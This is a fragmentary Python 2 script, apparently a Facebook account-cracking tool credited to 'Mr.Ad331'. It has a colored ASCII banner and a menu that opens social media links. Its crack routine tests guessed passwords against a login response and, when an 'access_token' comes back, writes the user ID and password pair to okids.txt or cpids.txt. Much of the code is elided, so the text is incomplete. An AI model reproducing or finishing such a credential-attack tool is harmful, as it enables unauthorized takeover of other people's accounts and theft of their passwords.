...
\033[1;92m\n_______  _______       _______  ______   _______  _______  _       
...
|/     \||/   \__/(_)  |/     \|(______/ (_______/(_______/(_______/
                                                                           
\n\033[0m-------------------------------------------
\033[1;92mAuthor \033[1;93m: Mr.Ad331
\033[1;92mFb \033[1;93m: Sawan 3:) :)
...
def main():
    ...
    print ' \033[0m[3].\x1b[1;96m MR.AD331 NAAM TO SUNA HOGA
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system(' xdg-open https://www.facebook.com/BlackkL0v3r')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
        os.system('xdg-open https://youtu.be/TLn9J-HhWDU')
        main()
    else:
        print ''
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[Ad331-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;31m[Ad331-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
